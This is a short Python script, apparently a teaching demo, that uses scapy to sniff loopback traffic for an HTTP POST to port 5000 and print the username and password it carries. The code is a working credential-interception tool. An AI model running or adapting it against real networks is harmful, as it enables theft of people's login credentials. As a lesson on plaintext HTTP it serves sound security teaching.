import logging

# Turns off scapy warnings for macOS (need this before any scapy imports)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# If we wanted to be specific with our imports:
# from scapy.sendrecv import sniff
# from scapy.layers.inet import TCP
# from scapy.packet import Raw
from scapy.all import *
from parse import parse

# This filters for TCP segments with a destination port of 5000
# that include the word "POST" in their decoded data section (aka payload)
#
# We are only looking for one packet: the username and password submission,
# which will be found in an HTTP POST request
lfilter = lambda p: TCP in p and Raw in p and p[TCP].dport == 5000 and "POST" in p[Raw].load.decode()
pcap = sniff(iface="lo0", lfilter=lfilter, count=1)
request_str = pcap[0][Raw].load.decode()

# The username and password are in the last line of the HTTP request (the rest is the HTTP request line and headers)
body = request_str.split("\n")[-1]

# We know that the username and password fields have the HTML input names
# of "username" and "password", but we could confirm this by inspecting the
# HTML source of the home page
login = parse("username={}&password={}", body)
print("username = " + login[0])
print("password = " + login[1])
